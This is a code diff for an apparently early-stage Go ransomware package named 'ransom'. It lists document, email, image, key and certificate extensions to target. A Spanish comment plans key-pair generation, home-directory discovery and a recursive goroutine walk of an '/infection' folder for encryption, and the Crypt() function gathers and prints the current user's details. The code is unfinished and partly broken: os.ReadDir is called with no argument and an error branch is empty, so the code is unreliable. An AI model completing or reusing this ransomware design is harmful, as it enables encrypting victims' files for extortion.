@@ -1,5 +1,11 @@
 package ransom
 
+import (
+	"fmt"
+	"os"
+	"os/user"
+)
+
 var Extensions = []string{
 	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg",
 	".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg",
@@ -16,6 +22,43 @@ var Extensions = []string{
 	".crt", ".key", ".pfx", ".der",
 }
 
+/* la movida:
+generamos localmente el par de claves
+la publica la guardamos, .dockerignore para la privada, .gitignore para las dos (regla en makefile)
+
+de alguna forma hemos de poder cargar en memoria la clave publica en la ejecucion
+cuando lo hagamos: obtenemos home user:
+- primero desde api
+- fallback, $HOME
+- fallback /home/$USER
+- error si tal
+
+iteramos desde la carpeta appendeande /infection
+cada colision con un fichero deberia ser una gorutina
+dir -> go(checkea file), si file es un dir pusheamos a cola, si no, procesa y prou
+
+gopapa espera mediante canal al fin del parseo del directorio, y despues de forma recursiva lanzamos para cada dir
+
+(go Dir() -> { go File() }) ??
+
+
+*/
+
 func Crypt() {
+	u, err := user.Current()
+	if err != nil {
+
+	}
+	uid := u.Uid
+	gid := u.Gid
+	username := u.Username
+	name := u.Name
+	homeDir := u.HomeDir
+	fmt.Printf("User data:\nuid %s\ngid: %s\nusername: %s\nname: %s\nhome:  %s\n", uid, gid, username, name, homeDir)
+
+	files, _ := os.ReadDir()
+}
+
+func Reverse(r string) {
 
 }
